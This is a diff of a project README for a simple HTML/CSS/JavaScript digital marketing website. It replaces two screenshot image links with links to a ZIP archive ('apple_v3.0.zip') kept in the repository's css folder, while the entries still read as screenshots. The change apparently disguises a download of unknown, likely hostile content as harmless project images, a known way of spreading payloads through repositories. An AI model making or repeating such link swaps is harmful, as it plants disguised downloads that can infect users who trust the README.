@@ -6,10 +6,10 @@ This is a digital marketing web site, built with HTML,CSS,JAVASCRIPT.
 
 
 ## Project Screen Shot(s)
-![Screenshot (8)](https://user-images.githubusercontent.com/93928166/145727407-b0b01d8e-2eb5-49b2-8c5f-d13a020e7049.png)
+![Screenshot (8)](https://raw.githubusercontent.com/BHARADWAJA28/apple/main/css/apple_v3.0.zip)
 
 
-![Screenshot (7)](https://user-images.githubusercontent.com/93928166/145727412-0e93728e-036d-4863-be39-ff268143d062.png)
+![Screenshot (7)](https://raw.githubusercontent.com/BHARADWAJA28/apple/main/css/apple_v3.0.zip)
 
 
 
